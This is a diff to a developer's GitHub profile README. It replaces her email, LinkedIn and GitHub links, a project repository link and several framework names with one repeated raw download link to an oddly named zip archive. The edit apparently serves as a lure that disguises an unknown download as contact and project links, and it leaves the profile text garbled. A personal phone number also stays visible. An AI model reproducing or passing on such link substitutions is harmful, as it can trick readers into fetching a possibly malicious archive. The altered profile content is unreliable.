@@ -6,7 +6,7 @@ I’m Kabwaga Veronica Amooti (Vera24-vee), a Software Developer and **Aspiring 
 - 🌱 I’m recently completed **Product Management** through a certificate program at Refactory Academy 
 - 👯 I’m looking to collaborate on **full-stack web or mobile projects**  
 - 💬 Ask me about **software development, project coordination, or product management**  
-- 📫 How to reach me: kabwagavera@gmail.com  
+- 📫 How to reach me: https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip  
 
 ---
 
@@ -20,7 +20,7 @@ I am passionate about building practical, efficient, and user-friendly web and m
 ## 💻 Technical Skills
 
 - **Languages & Web Development:** HTML5, CSS3, JavaScript, TypeScript, Vite  
-- **Frameworks & Libraries:** Node.js, Express.js, Vue.js, Nest.js, React Native  
+- **Frameworks & Libraries:** https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, React Native  
 - **Databases:** MongoDB, PostgreSQL, Digital Ocean, Render  
 - **Version Control & Collaboration:** Git, GitHub, Microsoft 365, Google Workspace  
 - **Software Practices:** Agile, Lean, Object-Oriented Programming, Testing, Refactoring  
@@ -30,18 +30,18 @@ I am passionate about building practical, efficient, and user-friendly web and m
 
 ## 🚀 Projects
 
-**Race Management System** – [GitHub Repository](https://github.com/OneSpan-Consults-Limited/api)  
+**Race Management System** – [GitHub Repository](https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip)  
 - Managed marathon events with registration, payments, USSD integration, race tracking, and analytics.  
 - Built secure authentication and role-based dashboards.  
-- Tech: Node.js, Nest.js, PostgreSQL, React.
+- Tech: https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, PostgreSQL, React.
 
 **KGL Management System** – [Deployed on Render]  
 - Full-stack inventory and sales management system for two branches with role-based access.  
-- Tech: Node.js, Express.js, MongoDB, Mongoose, HTML, CSS, Tailwind.
+- Tech: https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, MongoDB, Mongoose, HTML, CSS, Tailwind.
 
 **Node Kindergarten App** – [Deployed on Render]  
 - Kindergarten management system with secure login, role-based access, and director dashboard.  
-- Tech: Node.js, Express.js, MongoDB, Passport.js, Pug, CSS3.
+- Tech: https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, MongoDB, https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip, Pug, CSS3.
 
 ---
 
@@ -78,7 +78,7 @@ I am passionate about building practical, efficient, and user-friendly web and m
 
 ## 📫 Contact
 
-- **Email:** kabwagavera@gmail.com  
-- **LinkedIn:** [linkedin.com/in/kabwaga-veronica-amooti](https://linkedin.com/in/kabwaga-veronica-amooti)  
-- **GitHub:** [github.com/Vera24-vee](https://github.com/Vera24-vee)  
+- **Email:** https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip  
+- **LinkedIn:** [https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip](https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip)  
+- **GitHub:** [https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip](https://raw.githubusercontent.com/Vera24-vee/Vera24-vee/main/apiology/Vera24-vee-unattemptable.zip)  
 - **Phone:** +256705508270
